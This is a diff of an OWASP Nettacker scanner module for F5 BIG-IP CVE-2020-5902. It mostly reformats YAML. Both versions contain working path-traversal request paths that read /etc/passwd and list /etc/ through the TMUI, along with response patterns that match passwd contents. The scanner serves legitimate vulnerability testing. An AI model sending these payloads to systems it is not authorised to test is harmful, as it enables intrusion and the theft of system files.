@@ -2,47 +2,46 @@ info:
   name: f5_cve_2020_5902_vuln
   author: OWASP Nettacker Team
   severity: 9
-  description:
-  reference:
+  description: null
+  reference: null
   profiles:
-    - vuln
-    - http
-    - critical_severity
-    - cve
-    - f5
-
+  - vuln
+  - http
+  - critical_severity
+  - f5
+  - cve_2020
 payloads:
-  - library: http
-    steps:
-      - method: get
-        timeout: 3
-        headers:
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              paths:
-                - "tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
-                - "tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/etc/"
-                - "tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=id"
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: "200"
-              reverse: false
-            content:
-              regex: root:\\C+(:\\d+)+|/etc/passwd|/etc/shadow|uid\\=*.+gid
-              reverse: false
+- library: http
+  steps:
+  - method: get
+    timeout: 3
+    headers:
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/{{paths}}'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          paths:
+          - tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+          - tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/etc/
+          - tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=id
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    response:
+      condition_type: and
+      conditions:
+        status_code:
+          regex: '200'
+          reverse: false
+        content:
+          regex: root:\\C+(:\\d+)+|/etc/passwd|/etc/shadow|uid\\=*.+gid
+          reverse: false
